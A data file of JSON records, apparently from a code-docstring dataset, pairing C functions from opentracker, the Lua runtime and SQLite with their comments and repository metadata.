{"docstring": "/* Import Changeset from an external authority\n   format: d4:syncd[..]ee\n   [..]:   ( 20:01234567890abcdefghij16:XXXXYYYY )+\n*/\n", "func_signal": "int add_changeset_to_tracker( uint8_t *data, size_t len )", "code": "{\n  ot_hash    *hash;\n  uint8_t    *end = data + len;\n  unsigned long      peer_count;\n\n  /* We do know, that the string is \\n terminated, so it cant\n     overflow */\n  if( byte_diff( data, 8, \"d4:syncd\" ) ) return -1;\n  data += 8;\n\n  while( 1 ) {\n    if( byte_diff( data, 3, \"20:\" ) ) {\n      if( byte_diff( data, 2, \"ee\" ) )\n        return -1;\n      return 0;\n    }\n    data += 3;\n    hash = (ot_hash*)data;\n    data += sizeof( ot_hash );\n\n    /* Scan string length indicator */\n    data += ( len = scan_ulong( (char*)data, &peer_count ) );\n\n    /* If no long was scanned, it is not divisible by 8, it is not\n       followed by a colon or claims to need to much memory, we fail */\n    if( !len || !peer_count || ( peer_count & 7 ) || ( *data++ != ':' ) || ( data + peer_count > end ) )\n      return -1;\n\n    while( peer_count > 0 ) {\n      add_peer_to_torrent( hash, (ot_peer*)data, 1 );\n      data += 8; peer_count -= 8;\n    }\n  }\n  return 0;\n}", "path": "ot_sync.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/*\n** search function for integers\n*/\n", "func_signal": "const TValue *luaH_getnum (Table *t, int key)", "code": "{\n  /* (1 <= key && key <= t->sizearray) */\n  if (cast(unsigned int, key-1) < cast(unsigned int, t->sizearray))\n    return &t->array[key-1];\n  else {\n    lua_Number nk = cast_num(key);\n    Node *n = hashnum(t, nk);\n    do {  /* check whether `key' is somewhere in the chain */\n      if (ttisnumber(gkey(n)) && luai_numeq(nvalue(gkey(n)), nk))\n        return gval(n);  /* that's it */\n      else n = gnext(n);\n    } while (n);\n    return luaO_nilobject;\n  }\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** move a node from it's old position to it's new position during a rehash;\n** first, check whether the moving node's main position is free. If not, check whether\n** colliding node is in its main position or not: if it is not, move colliding\n** node to an empty place and put moving node in its main position; otherwise\n** (colliding node is in its main position), moving node goes to an empty position. \n*/\n", "func_signal": "static int move_node (lua_State *L, Table *t, Node *node)", "code": "{\n  (void)L;\n  Node *mp = mainposition(t, key2tval(node));\n  /* if node is in it's main position, don't need to move node. */\n  if (mp == node) return 1;\n  /* if node is in it's main position's chain, don't need to move node. */\n  if (find_prev_node(mp, node) != NULL) return 1;\n  /* is main position is free? */\n  if (!ttisnil(gval(mp)) || mp == dummynode) {\n    /* no; move main position node if it is out of its main position */\n    Node *othermp;\n    othermp = mainposition(t, key2tval(mp));\n    if (othermp != mp) {  /* is colliding node out of its main position? */\n      /* yes; swap colliding node with the node that is being moved. */\n      Node *prev;\n      Node tmp;\n      tmp = *node;\n      prev = find_prev_node(othermp, mp);  /* find previous */\n      if (prev != NULL) gnext(prev) = node;  /* redo the chain with `n' in place of `mp' */\n      *node = *mp;  /* copy colliding node into free pos. (mp->next also goes) */\n      *mp = tmp;\n      return (prev != NULL) ? 1 : 0; /* is colliding node part of its main position chain? */\n    }\n    else {  /* colliding node is in its own main position */\n      /* add node to main position's chain. */\n      gnext(node) = gnext(mp);  /* chain new position */\n      gnext(mp) = node;\n    }\n  }\n  else { /* main position is free, move node */\n    *mp = *node;\n    gnext(node) = NULL;\n    setnilvalue(gkey(node));\n    setnilvalue(gval(node));\n  }\n  return 1;\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** The next function tells whether a key or value can be cleared from\n** a weak table. Non-collectable objects are never removed from weak\n** tables. Strings behave as `values', so are never removed too. for\n** other objects: if really collected, cannot keep them; for userdata\n** being finalized, keep them in keys, but not in values\n*/\n", "func_signal": "static int iscleared (const TValue *o, int iskey)", "code": "{\n  if (!iscollectable(o)) return 0;\n  if (ttisstring(o)) {\n    stringmark(rawtsvalue(o));  /* strings are `values', so are never weak */\n    return 0;\n  }\n  return iswhite(gcvalue(o)) ||\n    (ttisuserdata(o) && (!iskey && isfinalized(uvalue(o))));\n}", "path": "src\\lgc.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** All marks are conditional because a GC may happen while the\n** prototype is still being created\n*/\n", "func_signal": "static void traverseproto (global_State *g, Proto *f)", "code": "{\n  int i;\n  if (f->source) stringmark(f->source);\n  for (i=0; i<f->sizek; i++)  /* mark literals */\n    markvalue(g, &f->k[i]);\n  for (i=0; i<f->sizeupvalues; i++) {  /* mark upvalue names */\n    if (f->upvalues[i])\n      stringmark(f->upvalues[i]);\n  }\n  for (i=0; i<f->sizep; i++) {  /* mark nested protos */\n    if (f->p[i])\n      markobject(g, f->p[i]);\n  }\n  for (i=0; i<f->sizelocvars; i++) {  /* mark local-variable names */\n    if (f->locvars[i].varname)\n      stringmark(f->locvars[i].varname);\n  }\n}", "path": "src\\lgc.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** Open string library\n*/\n", "func_signal": "LUALIB_API int luaopen_string (lua_State *L)", "code": "{\n  luaL_register(L, LUA_STRLIBNAME, strlib);\n#if defined(LUA_COMPAT_GFIND)\n  lua_getfield(L, -1, \"gmatch\");\n  lua_setfield(L, -2, \"gfind\");\n#endif\n  createmetatable(L);\n  return 1;\n}", "path": "src\\lstrlib.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** Try to find a boundary in table `t'. A `boundary' is an integer index\n** such that t[i] is non-nil and t[i+1] is nil (and 0 if t[1] is nil).\n*/\n", "func_signal": "int luaH_getn (Table *t)", "code": "{\n  unsigned int j = t->sizearray;\n  if (j > 0 && ttisnil(&t->array[j - 1])) {\n    /* there is a boundary in the array part: (binary) search for it */\n    unsigned int i = 0;\n    while (j - i > 1) {\n      unsigned int m = (i+j)/2;\n      if (ttisnil(&t->array[m - 1])) j = m;\n      else i = m;\n    }\n    return i;\n  }\n  /* else must find a boundary in hash part */\n  else if (t->node == dummynode)  /* hash part is empty? */\n    return j;  /* that is easy... */\n  else return unbound_search(t, j);\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** hash for lua_Numbers\n*/\n", "func_signal": "static Node *hashnum (const Table *t, lua_Number n)", "code": "{\n  unsigned int a[numints];\n  int i;\n  if (luai_numeq(n, 0))  /* avoid problems with -0 */\n    return gnode(t, 0);\n  memcpy(a, &n, sizeof(a));\n  for (i = 1; i < numints; i++) a[0] += a[i];\n  return hashmod(t, a[0]);\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** }=============================================================\n*/\n", "func_signal": "Table *luaH_new (lua_State *L, int narray, int nhash)", "code": "{\n  Table *t = luaM_new(L, Table);\n  luaC_link(L, obj2gco(t), LUA_TTABLE);\n  sethvalue2s(L, L->top, t); /* put table on stack */\n  incr_top(L);\n  t->metatable = NULL;\n  t->flags = cast_byte(~0);\n  /* temporary values (kept only if some malloc fails) */\n  t->array = NULL;\n  t->sizearray = 0;\n  t->lsizenode = 0;\n  t->node = cast(Node *, dummynode);\n  setarrayvector(L, t, narray);\n  resizenodevector(L, t, 0, nhash);\n  L->top--; /* remove table from stack */\n  return t;\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/* move `dead' udata that need finalization to list `tmudata' */\n", "func_signal": "size_t luaC_separateudata (lua_State *L, int all)", "code": "{\n  global_State *g = G(L);\n  size_t deadmem = 0;\n  GCObject **p = &g->mainthread->next;\n  GCObject *curr;\n  while ((curr = *p) != NULL) {\n    if (!(iswhite(curr) || all) || isfinalized(gco2u(curr)))\n      p = &curr->gch.next;  /* don't bother with them */\n    else if (fasttm(L, gco2u(curr)->metatable, TM_GC) == NULL) {\n      markfinalized(gco2u(curr));  /* don't need finalization */\n      p = &curr->gch.next;\n    }\n    else {  /* must call its gc method */\n      deadmem += sizeudata(gco2u(curr));\n      markfinalized(gco2u(curr));\n      *p = curr->gch.next;\n      /* link `curr' at the end of `tmudata' list */\n      if (g->tmudata == NULL)  /* list is empty? */\n        g->tmudata = curr->gch.next = curr;  /* creates a circular list */\n      else {\n        curr->gch.next = g->tmudata->gch.next;\n        g->tmudata->gch.next = curr;\n        g->tmudata = curr;\n      }\n    }\n  }\n  return deadmem;\n}", "path": "src\\lgc.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** returns the index of a `key' for table traversals. First goes all\n** elements in the array part, then elements in the hash part. The\n** beginning of a traversal is signalled by -1.\n*/\n", "func_signal": "static int findindex (lua_State *L, Table *t, StkId key)", "code": "{\n  int i;\n  if (ttisnil(key)) return -1;  /* first iteration */\n  i = arrayindex(key);\n  if (0 < i && i <= t->sizearray)  /* is `key' inside array part? */\n    return i-1;  /* yes; that's the index (corrected to C) */\n  else {\n    Node *n = mainposition(t, key);\n    do {  /* check whether `key' is somewhere in the chain */\n      /* key may be dead already, but it is ok to use it in `next' */\n      if (luaO_rawequalObj(key2tval(n), key) ||\n            (ttype(gkey(n)) == LUA_TDEADKEY && iscollectable(key) &&\n             gcvalue(gkey(n)) == gcvalue(key))) {\n        i = cast_int(n - gnode(t, 0));  /* key index in hash table */\n        /* hash elements are numbered after array ones */\n        return i + t->sizearray;\n      }\n      else n = gnext(n);\n    } while (n);\n    luaG_runerror(L, \"invalid key to \" LUA_QL(\"next\"));  /* key not found */\n    return 0;  /* to avoid warnings */\n  }\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** Call all GC tag methods\n*/\n", "func_signal": "void luaC_callGCTM (lua_State *L)", "code": "{\n  while (G(L)->tmudata)\n    GCTM(L);\n}", "path": "src\\lgc.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** returns the `main' position of an element in a table (that is, the index\n** of its hash value)\n*/\n", "func_signal": "static Node *mainposition (const Table *t, const TValue *key)", "code": "{\n  switch (ttype(key)) {\n    case LUA_TNUMBER:\n      return hashnum(t, nvalue(key));\n    case LUA_TSTRING:\n      return hashstr(t, rawtsvalue(key));\n    case LUA_TBOOLEAN:\n      return hashboolean(t, bvalue(key));\n    case LUA_TLIGHTUSERDATA:\n      return hashpointer(t, pvalue(key));\n    default:\n      return hashpointer(t, gcvalue(key));\n  }\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** inserts a new key into a hash table; first, check whether key's main \n** position is free. If not, check whether colliding node is in its main \n** position or not: if it is not, move colliding node to an empty place and \n** put new key in its main position; otherwise (colliding node is in its main \n** position), new key goes to an empty position. \n*/\n", "func_signal": "static TValue *newkey (lua_State *L, Table *t, const TValue *key)", "code": "{\n  Node *mp = mainposition(t, key);\n  if (!ttisnil(gval(mp)) || mp == dummynode) {\n    Node *othern;\n    Node *n = getfreepos(t);  /* get a free place */\n    if (n == NULL) {  /* cannot find a free place? */\n      rehash(L, t, key);  /* grow table */\n      return luaH_set(L, t, key);  /* re-insert key into grown table */\n    }\n    lua_assert(n != dummynode);\n    othern = mainposition(t, key2tval(mp));\n    if (othern != mp) {  /* is colliding node out of its main position? */\n      /* yes; move colliding node into free position */\n      while (gnext(othern) != mp) othern = gnext(othern);  /* find previous */\n      gnext(othern) = n;  /* redo the chain with `n' in place of `mp' */\n      *n = *mp;  /* copy colliding node into free pos. (mp->next also goes) */\n      gnext(mp) = NULL;  /* now `mp' is free */\n      setnilvalue(gval(mp));\n    }\n    else {  /* colliding node is in its own main position */\n      /* new node will go into free position */\n      gnext(n) = gnext(mp);  /* chain new position */\n      gnext(mp) = n;\n      mp = n;\n    }\n  }\n  gkey(mp)->value = key->value; gkey(mp)->tt = key->tt;\n  luaC_barriert(L, t, key);\n  lua_assert(ttisnil(gval(mp)));\n  return gval(mp);\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** main search function\n*/\n", "func_signal": "const TValue *luaH_get (Table *t, const TValue *key)", "code": "{\n  switch (ttype(key)) {\n    case LUA_TNIL: return luaO_nilobject;\n    case LUA_TSTRING: return luaH_getstr(t, rawtsvalue(key));\n    case LUA_TNUMBER: {\n      int k;\n      lua_Number n = nvalue(key);\n      lua_number2int(k, n);\n      if (luai_numeq(cast_num(k), nvalue(key))) /* index is int? */\n        return luaH_getnum(t, k);  /* use specialized version */\n      /* else go through */\n    }\n    default: {\n      Node *n = mainposition(t, key);\n      do {  /* check whether `key' is somewhere in the chain */\n        if (luaO_rawequalObj(key2tval(n), key))\n          return gval(n);  /* that's it */\n        else n = gnext(n);\n      } while (n);\n      return luaO_nilobject;\n    }\n  }\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** clear collected entries from weaktables\n*/\n", "func_signal": "static void cleartable (GCObject *l)", "code": "{\n  while (l) {\n    Table *h = gco2h(l);\n    int i = h->sizearray;\n    lua_assert(testbit(h->marked, VALUEWEAKBIT) ||\n               testbit(h->marked, KEYWEAKBIT));\n    if (testbit(h->marked, VALUEWEAKBIT)) {\n      while (i--) {\n        TValue *o = &h->array[i];\n        if (iscleared(o, 0))  /* value was collected? */\n          setnilvalue(o);  /* remove value */\n      }\n    }\n    i = sizenode(h);\n    while (i--) {\n      Node *n = gnode(h, i);\n      if (!ttisnil(gval(n)) &&  /* non-empty entry? */\n          (iscleared(key2tval(n), 1) || iscleared(gval(n), 0))) {\n        setnilvalue(gval(n));  /* remove value ... */\n        removeentry(n);  /* remove entry from table */\n      }\n    }\n    l = h->gclist;\n  }\n}", "path": "src\\lgc.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** returns the index for `key' if `key' is an appropriate key to live in\n** the array part of the table, -1 otherwise.\n*/\n", "func_signal": "static int arrayindex (const TValue *key)", "code": "{\n  if (ttisnumber(key)) {\n    lua_Number n = nvalue(key);\n    int k;\n    lua_number2int(k, n);\n    if (luai_numeq(cast_num(k), n))\n      return k;\n  }\n  return -1;  /* `key' did not match some condition */\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** search function for strings\n*/\n", "func_signal": "const TValue *luaH_getstr (Table *t, TString *key)", "code": "{\n  Node *n = hashstr(t, key);\n  do {  /* check whether `key' is somewhere in the chain */\n    if (ttisstring(gkey(n)) && rawtsvalue(gkey(n)) == key)\n      return gval(n);  /* that's it */\n    else n = gnext(n);\n  } while (n);\n  return luaO_nilobject;\n}", "path": "src\\ltable.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** Open math library\n*/\n", "func_signal": "LUALIB_API int luaopen_math (lua_State *L)", "code": "{\n  luaL_register(L, LUA_MATHLIBNAME, mathlib);\n  lua_pushnumber(L, PI);\n  lua_setfield(L, -2, \"pi\");\n  lua_pushnumber(L, HUGE_VAL);\n  lua_setfield(L, -2, \"huge\");\n#if defined(LUA_COMPAT_MOD)\n  lua_getfield(L, -1, \"fmod\");\n  lua_setfield(L, -2, \"mod\");\n#endif\n  return 1;\n}", "path": "src\\lmathlib.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/* mark root set */\n", "func_signal": "static void markroot (lua_State *L)", "code": "{\n  global_State *g = G(L);\n  g->gray = NULL;\n  g->grayagain = NULL;\n  g->weak = NULL;\n  markobject(g, g->mainthread);\n  /* make global table be traversed before main stack */\n  markvalue(g, gt(g->mainthread));\n  markvalue(g, registry(L));\n  markmt(g);\n  g->gcstate = GCSpropagate;\n}", "path": "src\\lgc.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** traverse one gray object, turning it to black.\n** Returns `quantity' traversed.\n*/\n", "func_signal": "static l_mem propagatemark (global_State *g)", "code": "{\n  GCObject *o = g->gray;\n  lua_assert(isgray(o));\n  gray2black(o);\n  switch (o->gch.tt) {\n    case LUA_TTABLE: {\n      Table *h = gco2h(o);\n      g->gray = h->gclist;\n      if (traversetable(g, h))  /* table is weak? */\n        black2gray(o);  /* keep it gray */\n      return sizeof(Table) + sizeof(TValue) * h->sizearray +\n                             sizeof(Node) * sizenode(h);\n    }\n    case LUA_TFUNCTION: {\n      Closure *cl = gco2cl(o);\n      g->gray = cl->c.gclist;\n      traverseclosure(g, cl);\n      return (cl_isC(cl)) ? sizeCclosure(cl->c.nupvalues) :\n                           sizeLclosure(cl->l.nupvalues);\n    }\n    case LUA_TTHREAD: {\n      lua_State *th = gco2th(o);\n      g->gray = th->gclist;\n      th->gclist = g->grayagain;\n      g->grayagain = o;\n      black2gray(o);\n      traversestack(g, th);\n      return sizeof(lua_State) + sizeof(TValue) * th->stacksize +\n                                 sizeof(CallInfo) * th->size_ci;\n    }\n    case LUA_TPROTO: {\n      Proto *p = gco2p(o);\n      g->gray = p->gclist;\n      traverseproto(g, p);\n      return sizeof(Proto) + sizeof(Instruction) * p->sizecode +\n                             sizeof(Proto *) * p->sizep +\n                             sizeof(TValue) * p->sizek + \n                             sizeof(int) * p->sizelineinfo +\n                             sizeof(LocVar) * p->sizelocvars +\n                             sizeof(TString *) * p->sizeupvalues;\n    }\n    default: lua_assert(0); return 0;\n  }\n}", "path": "src\\lgc.c", "repo_name": "Neopallium/slua", "stars": 64, "license": "other", "language": "c", "size": 640}
{"docstring": "/*\n** This function is invoked by the vdbe to call the xCreate method\n** of the virtual table named zTab in database iDb. \n**\n** If an error occurs, *pzErr is set to point an an English language\n** description of the error and an SQLITE_XXX error code is returned.\n** In this case the caller must call sqlite3DbFree(db, ) on *pzErr.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3VtabCallCreate(sqlite3 *db, int iDb, const char *zTab, char **pzErr)", "code": "{\n  int rc = SQLITE_OK;\n  Table *pTab;\n  Module *pMod;\n  const char *zMod;\n\n  pTab = sqlite3FindTable(db, zTab, db->aDb[iDb].zName);\n  assert( pTab && (pTab->tabFlags & TF_Virtual)!=0 && !pTab->pVTable );\n\n  /* Locate the required virtual table module */\n  zMod = pTab->azModuleArg[0];\n  pMod = (Module*)sqlite3HashFind(&db->aModule, zMod, sqlite3Strlen30(zMod));\n\n  /* If the module has been registered and includes a Create method, \n  ** invoke it now. If the module has not been registered, return an \n  ** error. Otherwise, do nothing.\n  */\n  if( !pMod ){\n    *pzErr = sqlite3MPrintf(db, \"no such module: %s\", zMod);\n    rc = SQLITE_ERROR;\n  }else{\n    rc = vtabCallConstructor(db, pTab, pMod, pMod->pModule->xCreate, pzErr);\n  }\n\n  /* Justification of ALWAYS():  The xConstructor method is required to\n  ** create a valid sqlite3_vtab if it returns SQLITE_OK. */\n  if( rc==SQLITE_OK && ALWAYS(sqlite3GetVTable(db, pTab)) ){\n      rc = addToVTrans(db, sqlite3GetVTable(db, pTab));\n  }\n\n  return rc;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Remove page pPage from the list of dirty pages.\n*/\n", "func_signal": "static void pcacheRemoveFromDirtyList(PgHdr *pPage)", "code": "{\n  PCache *p = pPage->pCache;\n\n  assert( pPage->pDirtyNext || pPage==p->pDirtyTail );\n  assert( pPage->pDirtyPrev || pPage==p->pDirty );\n\n  /* Update the PCache1.pSynced variable if necessary. */\n  if( p->pSynced==pPage ){\n    PgHdr *pSynced = pPage->pDirtyPrev;\n    while( pSynced && (pSynced->flags&PGHDR_NEED_SYNC) ){\n      pSynced = pSynced->pDirtyPrev;\n    }\n    p->pSynced = pSynced;\n  }\n\n  if( pPage->pDirtyNext ){\n    pPage->pDirtyNext->pDirtyPrev = pPage->pDirtyPrev;\n  }else{\n    assert( pPage==p->pDirtyTail );\n    p->pDirtyTail = pPage->pDirtyPrev;\n  }\n  if( pPage->pDirtyPrev ){\n    pPage->pDirtyPrev->pDirtyNext = pPage->pDirtyNext;\n  }else{\n    assert( pPage==p->pDirty );\n    p->pDirty = pPage->pDirtyNext;\n  }\n  pPage->pDirtyNext = 0;\n  pPage->pDirtyPrev = 0;\n\n  expensive_assert( pcacheCheckSynced(p) );\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Generate code for the ANALYZE command.  The parser calls this routine\n** when it recognizes an ANALYZE command.\n**\n**        ANALYZE                            -- 1\n**        ANALYZE  <database>                -- 2\n**        ANALYZE  ?<database>.?<tablename>  -- 3\n**\n** Form 1 causes all indices in all attached databases to be analyzed.\n** Form 2 analyzes all indices the single database named.\n** Form 3 analyzes all indices associated with the named table.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3Analyze(Parse *pParse, Token *pName1, Token *pName2)", "code": "{\n  sqlite3 *db = pParse->db;\n  int iDb;\n  int i;\n  char *z, *zDb;\n  Table *pTab;\n  Token *pTableName;\n\n  /* Read the database schema. If an error occurs, leave an error message\n  ** and code in pParse and return NULL. */\n  assert( sqlite3BtreeHoldsAllMutexes(pParse->db) );\n  if( SQLITE_OK!=sqlite3ReadSchema(pParse) ){\n    return;\n  }\n\n  assert( pName2!=0 || pName1==0 );\n  if( pName1==0 ){\n    /* Form 1:  Analyze everything */\n    for(i=0; i<db->nDb; i++){\n      if( i==1 ) continue;  /* Do not analyze the TEMP database */\n      analyzeDatabase(pParse, i);\n    }\n  }else if( pName2->n==0 ){\n    /* Form 2:  Analyze the database or table named */\n    iDb = sqlite3FindDb(db, pName1);\n    if( iDb>=0 ){\n      analyzeDatabase(pParse, iDb);\n    }else{\n      z = sqlite3NameFromToken(db, pName1);\n      if( z ){\n        pTab = sqlite3LocateTable(pParse, 0, z, 0);\n        sqlite3DbFree(db, z);\n        if( pTab ){\n          analyzeTable(pParse, pTab);\n        }\n      }\n    }\n  }else{\n    /* Form 3: Analyze the fully qualified table name */\n    iDb = sqlite3TwoPartName(pParse, pName1, pName2, &pTableName);\n    if( iDb>=0 ){\n      zDb = db->aDb[iDb].zName;\n      z = sqlite3NameFromToken(db, pTableName);\n      if( z ){\n        pTab = sqlite3LocateTable(pParse, 0, z, zDb);\n        sqlite3DbFree(db, z);\n        if( pTab ){\n          analyzeTable(pParse, pTab);\n        }\n      }\n    }   \n  }\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** A version of printf() that understands %lld.  Used for debugging.\n** The printf() built into some versions of windows does not understand %lld\n** and segfaults if you give it a long long int.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3DebugPrintf(const char *zFormat, ...)", "code": "{\n  va_list ap;\n  StrAccum acc;\n  char zBuf[500];\n  sqlite3StrAccumInit(&acc, zBuf, sizeof(zBuf), 0);\n  acc.useMalloc = 0;\n  va_start(ap,zFormat);\n  sqlite3VXPrintf(&acc, 0, zFormat, ap);\n  va_end(ap);\n  sqlite3StrAccumFinish(&acc);\n  fprintf(stdout,\"%s\", zBuf);\n  fflush(stdout);\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** This routine is called from the TCL test function \"translate_selftest\".\n** It checks that the primitives for serializing and deserializing\n** characters in each encoding are inverses of each other.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3UtfSelfTest(void)", "code": "{\n  unsigned int i, t;\n  unsigned char zBuf[20];\n  unsigned char *z;\n  int n;\n  unsigned int c;\n\n  for(i=0; i<0x00110000; i++){\n    z = zBuf;\n    WRITE_UTF8(z, i);\n    n = (int)(z-zBuf);\n    assert( n>0 && n<=4 );\n    z[0] = 0;\n    z = zBuf;\n    c = sqlite3Utf8Read(z, (const u8**)&z);\n    t = i;\n    if( i>=0xD800 && i<=0xDFFF ) t = 0xFFFD;\n    if( (i&0xFFFFFFFE)==0xFFFE ) t = 0xFFFD;\n    assert( c==t );\n    assert( (z-zBuf)==n );\n  }\n  for(i=0; i<0x00110000; i++){\n    if( i>=0xD800 && i<0xE000 ) continue;\n    z = zBuf;\n    WRITE_UTF16LE(z, i);\n    n = (int)(z-zBuf);\n    assert( n>0 && n<=4 );\n    z[0] = 0;\n    z = zBuf;\n    READ_UTF16LE(z, 1, c);\n    assert( c==i );\n    assert( (z-zBuf)==n );\n  }\n  for(i=0; i<0x00110000; i++){\n    if( i>=0xD800 && i<0xE000 ) continue;\n    z = zBuf;\n    WRITE_UTF16BE(z, i);\n    n = (int)(z-zBuf);\n    assert( n>0 && n<=4 );\n    z[0] = 0;\n    z = zBuf;\n    READ_UTF16BE(z, 1, c);\n    assert( c==i );\n    assert( (z-zBuf)==n );\n  }\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/* \n** Open a journal file.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3MemJournalOpen(sqlite3_file *pJfd)", "code": "{\n  MemJournal *p = (MemJournal *)pJfd;\n  assert( EIGHT_BYTE_ALIGNMENT(p) );\n  memset(p, 0, sqlite3MemJournalSize());\n  p->pMethod = &MemJournalMethods;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Read a single block from the %_segments table. If the specified block\n** does not exist, return SQLITE_CORRUPT. If some other error (malloc, IO \n** etc.) occurs, return the appropriate SQLite error code.\n**\n** Otherwise, if successful, set *pzBlock to point to a buffer containing\n** the block read from the database, and *pnBlock to the size of the read\n** block in bytes.\n**\n** WARNING: The returned buffer is only valid until the next call to \n** sqlite3Fts3ReadBlock().\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3Fts3ReadBlock(\n  Fts3Table *p,\n  sqlite3_int64 iBlock,\n  char const **pzBlock,\n  int *pnBlock\n)", "code": "{\n  sqlite3_stmt *pStmt;\n  int rc = fts3SqlStmt(p, SQL_GET_BLOCK, &pStmt, 0);\n  if( rc!=SQLITE_OK ) return rc;\n  sqlite3_reset(pStmt);\n\n  if( pzBlock ){\n    sqlite3_bind_int64(pStmt, 1, iBlock);\n    rc = sqlite3_step(pStmt); \n    if( rc!=SQLITE_ROW ){\n      return (rc==SQLITE_DONE ? SQLITE_CORRUPT : rc);\n    }\n  \n    *pnBlock = sqlite3_column_bytes(pStmt, 0);\n    *pzBlock = (char *)sqlite3_column_blob(pStmt, 0);\n    if( sqlite3_column_type(pStmt, 0)!=SQLITE_BLOB ){\n      return SQLITE_CORRUPT;\n    }\n  }\n  return SQLITE_OK;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** This function should be called when an IOERR, CORRUPT or FULL error\n** may have occurred. The first argument is a pointer to the pager \n** structure, the second the error-code about to be returned by a pager \n** API function. The value returned is a copy of the second argument \n** to this function. \n**\n** If the second argument is SQLITE_IOERR, SQLITE_CORRUPT, or SQLITE_FULL\n** the error becomes persistent. Until the persisten error is cleared,\n** subsequent API calls on this Pager will immediately return the same \n** error code.\n**\n** A persistent error indicates that the contents of the pager-cache \n** cannot be trusted. This state can be cleared by completely discarding \n** the contents of the pager-cache. If a transaction was active when\n** the persistent error occurred, then the rollback journal may need\n** to be replayed to restore the contents of the database file (as if\n** it were a hot-journal).\n*/\n", "func_signal": "static int pager_error(Pager *pPager, int rc)", "code": "{\n  int rc2 = rc & 0xff;\n  assert( rc==SQLITE_OK || !MEMDB );\n  assert(\n       pPager->errCode==SQLITE_FULL ||\n       pPager->errCode==SQLITE_OK ||\n       (pPager->errCode & 0xff)==SQLITE_IOERR\n  );\n  if( rc2==SQLITE_FULL || rc2==SQLITE_IOERR ){\n    pPager->errCode = rc;\n  }\n  return rc;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
